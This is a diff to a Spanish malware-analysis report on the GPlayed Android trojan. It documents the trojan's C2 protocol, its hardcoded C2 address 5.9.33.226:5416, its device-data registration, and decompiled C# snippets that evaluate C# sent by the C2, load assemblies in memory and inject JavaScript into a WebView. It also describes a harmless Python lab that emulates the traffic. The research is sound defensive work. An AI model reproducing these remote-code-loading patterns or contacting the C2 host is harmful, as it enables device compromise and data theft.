@@ -4,15 +4,19 @@
 
 ### S0536 -- GPlayed
 
-GPlayed es un troyano para Android desarrollado con Xamarin, cuya arquitectura y capacidades fueron descritas por Cisco Talos en su [análisis de la familia](https://blog.talosintelligence.com/gplayedtrojan/). El código Java del APK está formado principalmente por los contenedores y enlaces generados para comunicar Android con Mono; la lógica relevante se encuentra en los ensamblados .NET incluidos en `assemblies/`. En esta muestra, `eCommon.dll` define el protocolo y los objetos intercambiados, mientras que `Reznov.dll` contiene el ensamblado `eClient`, responsable de la comunicación y de ejecutar las órdenes.
+GPlayed es un troyano para Android desarrollado con Xamarin (plataforma que permite esciribir código .NET para Android), cuya arquitectura y capacidades fueron descritas por Cisco Talos en su [análisis de la familia](https://blog.talosintelligence.com/gplayedtrojan/). En este caso, la muestra intenta hacerse pasar por Google Play Store.
 
-El flujo seleccionado estudia la recepción de código desde el C2 mediante las respuestas `Evaluate`, `LoadScript`, `LoadPlugin` y `AddInject`. Las tres primeras transportan código C# o un ensamblado .NET. La última puede transportar JavaScript para un `WebView` con una interfaz JavaScript habilitada. Estas capacidades se corresponden con [**T1407 - Download New Code at Runtime**](https://attack.mitre.org/techniques/T1407/), técnica que MITRE también atribuye a [GPlayed (S0536)](https://attack.mitre.org/software/S0536/).
+![Icono y nombre empleados por GPlayed para hacerse pasar por Google Play Store en el launcher de Android.](<images/GPlayed.png>){#fig-gplayed-suplantacion fig-alt="Captura del launcher de Android con GPlayed presentado como Play Store." width="32%"}
 
-| Artefacto | Tipo | Identificación | SHA-256 |
-|---|---|---|---|
-| `GPlayed.apk` | APK de Android | Paquete `verReznov.Coampany`; versión `Lollipopka`; API mínima 10 y objetivo 22 | [`a342a16082ea53d101f556b50532651cd3e3fdc7d9e0be3aa136680ad9c6a69f`]{.content-visible unless-format="pdf"}[`\nolinkurl{a342a16082ea53d101f556b50532651cd3e3fdc7d9e0be3aa136680ad9c6a69f}`{=latex}]{.content-visible when-format="pdf"} |
-| `assemblies/eCommon.dll` | Ensamblado .NET incluido en la APK | Ensamblado `eCommon` 1.0.0.0; modelos y codificación del protocolo | [`604deb75eedf439766896f05799752de268baf437bf89a7185540627ab4a4bd1`]{.content-visible unless-format="pdf"}[`\nolinkurl{604deb75eedf439766896f05799752de268baf437bf89a7185540627ab4a4bd1}`{=latex}]{.content-visible when-format="pdf"} |
-| `assemblies/Reznov.dll` | Ensamblado Xamarin incluido en la APK | Ensamblado `eClient` 1.0.0.0; Xamarin.Android 5.1; canal C2 y ejecución de órdenes | [`17b8665cdbbb94482ca970a754d11d6e29c46af6390a2d8e8193d8d6a527dec3`]{.content-visible unless-format="pdf"}[`\nolinkurl{17b8665cdbbb94482ca970a754d11d6e29c46af6390a2d8e8193d8d6a527dec3}`{=latex}]{.content-visible when-format="pdf"} |
+El código Java del APK está formado principalmente por los contenedores y enlaces generados para comunicar Android con Mono; la lógica relevante se encuentra en los ensamblados .NET incluidos en `assemblies/`. En esta muestra, `eCommon.dll` define el protocolo y los objetos intercambiados, mientras que `Reznov.dll` contiene el ensamblado `eClient`, responsable de la comunicación y de ejecutar las órdenes.
+
+El malware es ampliamente modular, tiene diferentes capacidades [**T1407 - Download New Code at Runtime**](https://attack.mitre.org/techniques/T1407/), técnica que MITRE también atribuye a [GPlayed (S0536)](https://attack.mitre.org/software/S0536/). Las tres primeras capacidades transportan código C# o un ensamblado .NET. En cambio, la última puede transportar JavaScript para un `WebView` con una interfaz JavaScript habilitada. 
+
+| Artefacto                | Tipo                                  | Identificación                                                                     | SHA-256                                                            |
+| ------------------------ | ------------------------------------- | ---------------------------------------------------------------------------------- | ------------------------------------------------------------------ |
+| `GPlayed.apk`            | APK de Android                        | Paquete `verReznov.Coampany`; versión `Lollipopka`; API mínima 10 y objetivo 22    | `a342a16082ea53d101f556b50532651cd3e3fdc7d9e0be3aa136680ad9c6a69f` |
+| `assemblies/eCommon.dll` | Ensamblado .NET incluido en la APK    | Ensamblado `eCommon` 1.0.0.0; modelos y codificación del protocolo                 | `604deb75eedf439766896f05799752de268baf437bf89a7185540627ab4a4bd1` |
+| `assemblies/Reznov.dll`  | Ensamblado Xamarin incluido en la APK | Ensamblado `eClient` 1.0.0.0; Xamarin.Android 5.1; canal C2 y ejecución de órdenes | `17b8665cdbbb94482ca970a754d11d6e29c46af6390a2d8e8193d8d6a527dec3` |
 
 #### Peticiones y respuestas del C2
 
@@ -99,16 +103,14 @@ public class AddInject
 
 Cada rama produce una transición local distinta:
 
-| Respuesta | Contenido entregado | Tratamiento en la muestra |
-|---|---|---|
-| `Evaluate` | Código C# en `Script` | Evaluación inmediata mediante `Mono.CSharp.Evaluator`; no se guarda en disco |
-| `LoadScript` | Nombre, código C# y `AutoLoad` | Ejecución inmediata; solo se guarda si `AutoLoad` es verdadero |
-| `LoadPlugin` | Nombre, ensamblado y `AutoLoad` | Carga desde memoria mediante `Assembly.Load(byte[])`; solo se guarda si `AutoLoad` es verdadero |
-| `AddInject` | Actividad de destino y HTML | Conservación en memoria; presentación posterior en un `WebView` cuando se detecta la actividad indicada |
+| Respuesta    | Contenido entregado             | Tratamiento en la muestra                                                                                |
+| ------------ | ------------------------------- | -------------------------------------------------------------------------------------------------------- |
+| `Evaluate`   | Código C# en `Script`           | Evaluación inmediata mediante `Mono.CSharp.Evaluator`; no se guarda en disco.                            |
+| `LoadScript` | Nombre, código C# y `AutoLoad`  | Ejecución inmediata; solo se guarda si `AutoLoad` es verdadero.                                          |
+| `LoadPlugin` | Nombre, ensamblado y `AutoLoad` | Carga desde memoria mediante `Assembly.Load(byte[])`; solo se guarda si `AutoLoad` es verdadero.         |
+| `AddInject`  | Actividad de destino y HTML     | Conservación en memoria; presentación posterior en un `WebView` cuando se detecta la actividad indicada. |
 
-La persistencia de `LoadScript` y `LoadPlugin` es, por tanto, condicional. La presencia de esos comandos no implica por sí sola que el código quede almacenado entre ejecuciones.
-
-La ruta `Evaluate` entrega el texto directamente al evaluador creado por `eScripting`. El método `LoadCode()` lo ejecuta en el hilo de la aplicación:
+La persistencia de `LoadScript` y `LoadPlugin` es, por tanto, condicional. La ruta `Evaluate` entrega el texto directamente al evaluador creado por `eScripting`. El método `LoadCode()` lo ejecuta en el hilo de la aplicación:
 
 ```csharp
 public void LoadCode(string code)
@@ -211,7 +213,7 @@ public static void TryActivity(string activity)
 }
 ```
 
-El diálogo habilita JavaScript, expone el objeto `webapi` mediante [`AddJavascriptInterface()`]{.content-visible unless-format="pdf"}[`\nolinkurl{AddJavascriptInterface()}`{=latex}]{.content-visible when-format="pdf"} y entrega el HTML a `WebView.LoadData()`:
+El diálogo habilita JavaScript, expone el objeto `webapi` mediante `AddJavascriptInterface()` y entrega el HTML a `WebView.LoadData()`:
 
 ```csharp
 webView.Settings.JavaScriptEnabled = true;
@@ -247,16 +249,14 @@ public void SendInjectData(string activity, string data)
 }
 ```
 
-La relación de `AddInject` con T1407 requiere que el HTML recibido contenga JavaScript ejecutable. El mero transporte de HTML estático no bastaría para considerarlo nuevo código. El laboratorio utiliza una página inocua que sí incluye JavaScript, aunque el cliente Python se limita a decodificarla y no reproduce el `WebView` ni el disparador asociado a la actividad.
-
-La dirección principal del C2 se define en `eConstants`:
+La relación de `AddInject` con T1407 requiere que el HTML recibido contenga JavaScript ejecutable. El mero transporte de HTML estático no bastaría para considerarlo nuevo código. La dirección principal del C2 se define en `eConstants`:
 
 ```csharp
 public static string Server { get; set; } =
     "http://5.9.33.226:5416/";
 ```
 
-El extremo usa HTTP en el puerto 5416. Esto permite estudiar también [**T1509 - Non-Standard Port**](https://attack.mitre.org/techniques/T1509/), ya que el protocolo web circula por un puerto diferente de los asignados habitualmente a HTTP y HTTPS.
+El extremo usa HTTP en el puerto 5416. Esto permite estudiar también [**T1509 - Non-Standard Port**](https://attack.mitre.org/techniques/T1509/), ya que el protocolo web circula por un puerto diferente al asignado por IANA.
 
 #### Comunicación con el C&C
 
@@ -294,7 +294,7 @@ private void OnPing(object sender, ElapsedEventArgs e)
 
 El registro reúne el IMEI, la versión y compilación de Android, el modelo, el fabricante, el país, el número de teléfono, el IMSI, el operador y una lista de capacidades. La clase `eNetRequest` serializa este objeto con Newtonsoft.Json antes de entregarlo a `eNetwork.Request()`.
 
-La función de red concatena el servidor, el parámetro `q`, el IMEI, el nombre de `ERequest` y el JSON codificado:
+La función de red concatena el servidor, un parámetro `q` que contendrá el IMEI, el nombre de `ERequest` y el JSON codificado:
 
 ```csharp
 string encodedJson = eUtility.Base64Encode(req.JSON)
@@ -315,7 +315,7 @@ string url = string.Concat(
 string responseText = webClient.DownloadString(url);
 ```
 
-El método `DownloadString()` realiza una petición HTTP `GET`. Antes del escapado propio de una URI, el valor lógico del parámetro presenta esta estructura:
+El método `DownloadString()` realiza una petición HTTP `GET`. El valor lógico del parámetro `q` presenta esta estructura:
 
 ```http
 GET /?q=<IMEI>-<ERequest>:<Base64 modificado del JSON> HTTP/1.1
@@ -325,12 +325,10 @@ Host: 5.9.33.226:5416
 La codificación Base64 de las peticiones sustituye tres caracteres para que el contenido viaje dentro de la consulta:
 
 | Carácter Base64 | Representación transmitida |
-|---|---|
-| `+` | `|` |
-| `=` | `AAAZZZXXX` |
-| `/` | `.` |
-
-Estos reemplazos no cifran el JSON. Solo alteran su representación y pueden coexistir con el escapado porcentual aplicado por la biblioteca HTTP a caracteres reservados de la URI.
+| --------------- | -------------------------- |
+| +               | \|                         |
+| =               | AAAZZZXXX                  |
+| /               | .                          |
 
 El servidor responde con el nombre textual de `EResponse`, un carácter de dos puntos y el JSON codificado con Base64 estándar:
 
@@ -382,11 +380,12 @@ case EResponse.AddInject:
 }
 ```
 
-La muestra contiene además una ruta secundaria basada en `ClientWebSocket` hacia `5.9.33.226:5417/ws/`. El método `eNetwork.Request()` intenta utilizarla para peticiones distintas de `Ping` cuando falla la solicitud HTTP. Esta alternativa no interviene en el escenario seleccionado: el laboratorio mantiene disponible el C2 HTTP y reproduce las cuatro órdenes como respuestas a sondeos satisfactorios.
+La muestra contiene además una ruta secundaria basada en `ClientWebSocket` hacia `5.9.33.226:5417/ws/`. El método `eNetwork.Request()` intenta utilizarla para peticiones distintas de `Ping` cuando falla la solicitud HTTP. Esta alternativa no va a desarrollarse en el estudio por motivos de simplicidad, el objetivo es cubrir técnicas y no canales de comunicación.
 
 #### Secuencia comunicativa
 
-El diagrama resume el flujo que reproduce el laboratorio. Las cuatro órdenes se entregan en respuestas sucesivas a peticiones `Ping`:
+El diagrama resume el flujo esperado, tras los descubrimientos obtenidos en el procedimiento de ingeniería inversa. Las cuatro órdenes se entregan en respuestas sucesivas a peticiones `Ping`:
+
 
 ```{=latex}
 \clearpage
@@ -394,8 +393,8 @@ El diagrama resume el flujo que reproduce el laboratorio. Las cuatro órdenes se
 
 ```{mermaid}
 %%| label: fig-gplayed-comunicaciones
-%%| fig-cap: "Secuencia de comunicaciones reproducida para GPlayed."
-%%| fig-width: 6.0
+%%| fig-cap: "Registro y sondeos HTTP de GPlayed para recibir código, scripts, ensamblados y plantillas de inyección."
+%%| fig-width: 6
 sequenceDiagram
     participant C as "Cliente GPlayed emulado"
     participant S as "C2 HTTP emulado"
@@ -413,24 +412,13 @@ sequenceDiagram
     Note over C: El cliente de laboratorio decodifica los contenidos, pero no los ejecuta
 ```
 
-```{=latex}
-\clearpage
-```
-
-
 #### Laboratorio de generación del PCAP
 
-La APK incluye bibliotecas nativas únicamente para `armeabi-v7a`. Por ello no puede ejecutarse de forma nativa en un AVD x86 sin una capa adicional de traducción ARM. El laboratorio evita esa dependencia mediante un cliente y un servidor escritos en Python que reproducen el protocolo derivado del código. La captura representa la firma de red de GPlayed, no una ejecución de la APK original ni de sus efectos locales.
+La APK incluye bibliotecas nativas únicamente para `armeabi-v7a`. Por ello no puede ejecutarse de forma nativa en un AVD x86 sin una capa adicional de traducción ARM. Una opción alternativa sería utilizar un terminal Android y montar un laboratorio en el que poder generar la captura de tráfico. Hacer este montaje en Android es bastante más sencillo que su contraparte en iOS (la cual requiere Jailbreak). Aun así, requiere un trabajo considerable. He considerado que el protocolo de C&C es suficientemente sencillo y claro como para poder emular completamente la comunicación con un cliente/servidor Python, sin perder validez científica alguna.
 
-El servidor escucha en el puerto 5416 y responde primero con `Ok` al registro. Después entrega, en cuatro sondeos consecutivos, `Evaluate`, `LoadScript`, `LoadPlugin` y `AddInject`. Los contenidos son controlados e inocuos. Como el servidor se inicia sin `--autoload`, los campos `AutoLoad` de las dos ramas que lo admiten se envían con valor falso.
+El servidor escucha en el puerto 5416 y responde primero con `Ok` al registro. Después entrega, en cuatro sondeos consecutivos, `Evaluate`, `LoadScript`, `LoadPlugin` y `AddInject`. Los contenidos son controlados e inocuos (a nivel de red no afecta que sean reales como para detectarlos). El servidor contiene una opción de línea de comandos relativa al parámetro `autoload`. Como se comentó al inicio, dicho valor permite persistir algunos de los artefactos compartidos por el C2 (los procesos Python no persisten nada, esto solo permite que aparezca en red). Por defecto está en falso. Las entidades se han configurado como:
 
 | Entidad | Dirección y servicio | Procedencia |
 |---|---|---|
 | Víctima emulada | `10.53.6.10` | Dirección privada asignada al cliente dentro de la topología aislada. |
 | C2 de GPlayed | `5.9.33.226:5416` | URL HTTP fijada en la propiedad `Server` de la muestra analizada y publicada por [Cisco Talos](https://blog.talosintelligence.com/gplayedtrojan/) como IOC de GPlayed. |
-
-No se necesita una autoridad de certificación porque el canal seleccionado usa HTTP sin TLS. El cliente conecta directamente con `5.9.33.226:5416` y conserva ese mismo extremo en la cabecera `Host`.
-
-
-La captura resultante debe mostrar una petición de registro y cuatro peticiones `Ping`, todas mediante HTTP sobre TCP/5416. Las respuestas transportan las cuatro variantes de código o contenido dinámico. Esta evidencia permite demostrar su entrega por red y la utilización de un puerto no estándar; la evaluación de C#, la carga del ensamblado y la presentación del `WebView` se deducen del código analizado, pero no son ejecutadas por el cliente Python ni pueden confirmarse únicamente con la PCAP.
-
